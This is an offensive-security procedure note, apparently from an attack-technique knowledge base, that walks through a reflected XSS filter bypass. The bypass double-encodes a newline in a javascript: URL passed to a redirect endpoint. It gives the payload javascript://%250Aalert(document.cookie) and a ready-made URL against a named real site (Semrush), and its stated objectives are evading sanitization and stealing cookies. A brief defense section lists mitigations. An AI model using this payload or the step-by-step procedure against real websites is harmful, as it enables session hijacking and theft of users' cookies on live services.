---
tags:
  - xss
  - bypass
  - encoding
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: ea7d3648-a5ab-4791-8041-046302167e69
created_at: '2025-12-14T03:47:12.600Z'
updated_at: '2025-12-14T03:47:12.600Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Double-Encode-Newline-for-XSS-Bypass

## Summary

This procedure bypasses URL validation in a redirect endpoint by double-encoding the newline character (%0a to %250a) in a javascript: payload, enabling reflected XSS execution as exploited in Semrush.

## Description

Targeting web apps with insufficient sanitization, this injects a payload like javascript://%250Aalert(document.cookie) into /redirect?url=. The double-encoding evades filters expecting single-encoded inputs. Prerequisites: Knowledge of the endpoint and encoding. Expected: Arbitrary JS execution for cookie theft.

## Requirements

1. URL encoder (browser console or online tool)
2. Access to target redirect endpoint
3. Testing browser

## Defense

Defensive measures and detection strategies:

- Decode and validate URLs multiple times
- Block double-encoded characters in inputs
- Monitor for JS scheme usage in logs

## Objectives

1. Evade sanitization filters
2. Execute JavaScript in victim context
3. Steal sensitive data like cookies

## Instructions

### Step 1: Encode Payload

**Context**: Double-encode the newline to bypass validation.

Start with javascript://%0aalert(document.cookie), then encode %0a as %250a, yielding javascript://%250Aalert(document.cookie).

> Expected: Payload ready for injection.

### Step 2: Inject and Trigger

**Context**: Append to target URL and visit.

Use: https://www.semrush.com/redirect?url=javascript://%250Aalert(document.cookie). Load in browser.

> Expected: Alert pops with cookies; XSS successful.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss-bypass]]
- [[double-encoding]]
